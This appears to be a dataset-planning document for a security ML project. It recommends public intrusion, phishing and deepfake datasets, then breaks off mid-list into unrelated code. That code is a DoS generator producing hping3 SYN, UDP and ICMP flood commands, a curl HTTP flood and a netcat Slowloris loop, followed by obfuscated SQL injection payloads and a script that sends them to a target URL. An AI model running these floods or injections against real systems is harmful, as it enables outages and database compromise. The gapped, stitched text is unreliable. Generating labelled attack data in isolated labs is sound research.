Pashupatastra: Comprehensive Dataset Recommendations

## 🎯 Dataset Selection Strategy
This document provides curated, up-to-date datasets (2024-2025) for all five threat domains in your Pashupatastra project. These datasets are publicly available, well-documented, and suitable for AI/ML training.

## 1️⃣ Network Layer Threats (DoS/DDoS, Port Scanning, DNS Poisoning)

### **Primary Recommended Datasets:**

#### A. **UM-NIDS (Unified Multimodal Network Intrusion Detection Systems Dataset)** ⭐ RECOMMENDED
- **Source:** IEEE DataPort (2024)
- **Link:** https://dx.doi.org/10.21227/d8at-gb29
- **Description:** Integrates CIC-IDS 2017, CIC-IoT 2023, UNSW-NB15, and CIC-DDoS 2019
- **Features:** Flow-level and payload-based data with contextual features
- **Coverage:** DoS, DDoS, Port Scanning, various attack types
- **Why:** Comprehensive, standardized, supports cross-dataset validation

#### B. **BCCC-cPacket-Cloud-DDoS-2024**
- **Source:** MDPI Sensors (March 2024)
- **Link:** https://www.mdpi.com/2078-2489/15/4/195
- **Description:** Cloud-based DDoS dataset with 8+ benign activities and 17 DDoS scenarios
- **Features:** 300+ features from network/transport layers using NTLFlowLyzer
- **Coverage:** Cloud-specific DDoS attacks
- **Why:** Most recent cloud-focused dataset

#### C. **CIC-IDS2017** (Fallback Option)
- **Source:** Canadian Institute for Cybersecurity
- **Link:** https://www.unb.ca/cic/datasets/ids-2017.html
- **Description:** 5 days of network traffic with labeled attacks
- **Features:** 80+ features using CICFlowMeter
- **Coverage:** DoS, DDoS, Brute Force, Web attacks, Botnet
- **Why:** Well-established benchmark, widely used

#### D. **IoT-DH Dataset**
- **Source:** ScienceDirect (May 2024)
- **Description:** DDoS attacks in IoT ecosystems
- **Why:** Useful for IoT-specific network threats

## 2️⃣ Application Layer Threats (SQL Injection, XSS, Malicious URLs)

### **Primary Recommended Datasets:**

#### A. **SQL Injection Detection Dataset** ⭐ RECOMMENDED
- **Source:** IEEE DataPort (August 2025)
- **Link:** https://dx.doi.org/10.21227/qqtb-1803
- **Description:** 244,068 SQL queries (136,740 malicious + 107,328 benign)
- **Coverage:** Simple tautologies to complex obfuscated injection techniques
- **Why:** Most comprehensive and recent SQLi dataset

#### B. **HTTP CSIC 2010**
- **Source:** CSIC (Benchmark Dataset)
- **Link:** https://www.kaggle.com/datasets/ispangler/csic-2010-web-application-attacks
- **Description:** Web application attacks benchmark
- **Coverage:** SQL injection, XSS, various web attacks
- **Why:** Industry-standard benchmark for web attacks

#### C. **PhiUSIIL Phishing URL Dataset** ⭐ RECOMMENDED
- **Source:** UCI Machine Learning Repository (2024)
- **Link:** https://archive.ics.uci.edu/dataset/967/phiusiil+phishing+url+dataset
- **Description:** 134,850 legitimate + 100,945 phishing URLs
- **Features:** CharContinuationRate, URLTitleMatchScore, URLCharProb, TLDLegitimateProb
- **Why:** Latest URLs with advanced feature engineering

#### D. **PhishOFE Dataset**
- **Source:** IEEE DataPort (March 2025)
- **Link:** https://dx.doi.org/10.21227/tk80-5t77
- **Description:** Comprehensive phishing URL detection with URL, HTML, and derived features
- **Why:** Most recent with multiple feature types

#### E. **WikiPhish Dataset**
- **Source:** ACM CODASPY 2024
- **Description:** 110,606 webpages from Wikipedia references, OpenPhish, and PhishTank
- **Why:** Diverse, renewable dataset leveraging Wikipedia's verification

## 3️⃣ Content Layer Threats (Deepfakes, Fake News, AI-Generated Media)

### **Deepfake Detection:**

#### A. **Deepfake-Eval-2024** ⭐ RECOMMENDED
- **Source:** arXiv (March 2025)
- **Link:** https://github.com/nuriachandra/Deepfake-Eval-2024
- **Description:** In-the-wild deepfakes from social media in 2024
- **Content:** 44 hours video, 56.5 hours audio, 1,975 images
- **Coverage:** 88 websites, 52 languages, latest manipulation technologies
- **Why:** Most realistic, contemporary real-world deepfakes

#### B. **ExDDV (Explainable Deepfake Detection in Video)**
- **Source:** arXiv (March 2025)
- **Link:** https://arxiv.org/abs/2503.14421
- **Description:** 5.4K videos with manual annotations (text + clicks)
- **Features:** Explainable AI annotations for artifact localization
- **Why:** Includes interpretability features

- **Source:** Global Multimedia Deepfake Detection Challenge 2024
- **Description:** Large-scale images and audio-videos
- **MultiFFI:** 80+ generation algorithms

- **Why:** Most comprehensive variety of forgery methods

#### D. **FaceForensics++** (Fallback)

- **Why:** Well-established benchmark

#### E. **DFDC (Deep Fake Detection Challenge)**

```python
"""
DoS Attack Generator
Safe, controlled, isolated environment only
"""

class DoSAttackGenerator:
    
    @staticmethod
    def syn_flood(target_ip, duration_sec=300):
        """SYN flood attack"""
        cmd = f"hping3 -S --flood -V -p 80 {target_ip}"
        return cmd
    
    @staticmethod
    def udp_flood(target_ip, duration_sec=300):
        """UDP flood attack"""
        cmd = f"hping3 --udp --flood -p 53 {target_ip}"
        return cmd
    
    @staticmethod
    def icmp_flood(target_ip, duration_sec=300):
        """ICMP flood (Ping flood)"""
        cmd = f"hping3 --icmp --flood {target_ip}"
        return cmd
    
    @staticmethod
    def http_flood(target_ip, duration_sec=300):
        """HTTP GET flood"""
        script = f"""
        end_time=$(($(date +%s) + {duration_sec}))
        while [ $(date +%s) -lt $end_time ]; do
            curl -s http://{target_ip}/ > /dev/null &
        done
        wait
        """
        return script
    
    @staticmethod
    def slowloris(target_ip, connections=1000):
        """Slowloris attack - slow HTTP"""
        script = f"""
        for i in {{1..{connections}}}; do
            (while true; do
                echo -ne "GET / HTTP/1.1\\r\\nHost: {target_ip}\\r\\n" | nc {target_ip} 80
                sleep 10
            done) &
        done
        """
        return script
```

```python
SQL_INJECTION_PAYLOADS = [

    "' %55nion %53elect null--",  # URL encoding
    "' /*!UNION*/ /*!SELECT*/ null--",  # MySQL comments
    "' union/**/select/**/null--",  # Whitespace evasion
    
    # Second-order injections
    "admin' INTO OUTFILE '/tmp/test.txt'--",
    
    # Add 70+ more realistic payloads...
]

# Normal SQL queries for comparison
NORMAL_SQL_QUERIES = [
    "1",
    "2",
    "admin",
    "john",
    "user123",
    "SELECT * FROM products WHERE id=1",
    "SELECT name FROM users WHERE id=5",
    # Add 30+ more normal queries
]

def generate_sql_injection_dataset(target_url, output_file='sql_injection_data.csv'):
    """Generate SQL injection dataset"""
    import requests
    import pandas as pd
    import time
    
    data = []
    
    print(f"🔴 Testing {len(SQL_INJECTION_PAYLOADS)} malicious payloads...")
    for i, payload in enumerate(SQL_INJECTION_PAYLOADS, 1):
        try:
            response = requests.get(
                target_url,
                params={'id': payload, 'Submit': 'Submit'},
                timeout=10
            )
            
            data.append({
                'payload': payload,
                'response_code': response.status_code,
                'response_length': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'contains_error': 'error' in response.text.lower(),
                'label': 'sql_injection'
            })
            
            if i % 10 == 0:
                print(f"  Progress: {i}/{len(SQL_INJECTION_PAYLOADS)}")
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"  Error with payload {i}: {e}")
    
    print(f"🔵 Testing {len(NORMAL_SQL_QUERIES)} normal queries...")
    for query in NORMAL_SQL_QUERIES:
        try:
            response = requests.get(
                target_url,
                params={'id': query, 'Submit': 'Submit'},
                timeout=10
            )
            
            data.append({
                'payload': query,
                'response_code': response.status_code,
                'response_length': len(response.content),
                'response_time': response.elapsed.total_seconds(),
                'contains_error': 'error' in response.text.lower(),
                'label': 'normal'
            })
            
            time.sleep(0.5)
            
        except Exception as e:
            print(f"  Error with query: {e}")
    
    # Save dataset
    df = pd.DataFrame(data)
    df.to_csv(output_file, index=False)
    
    print(f"\n✅ SQL Injection dataset created: {output_file}")
    print(f"   Total samples: {len(df)}")
    print(f"   Malicious: {len(df[df['label']=='sql_injection'])}")
    print(f"   Normal: {len(df[df['label']=='normal'])}")
    
    return df
```
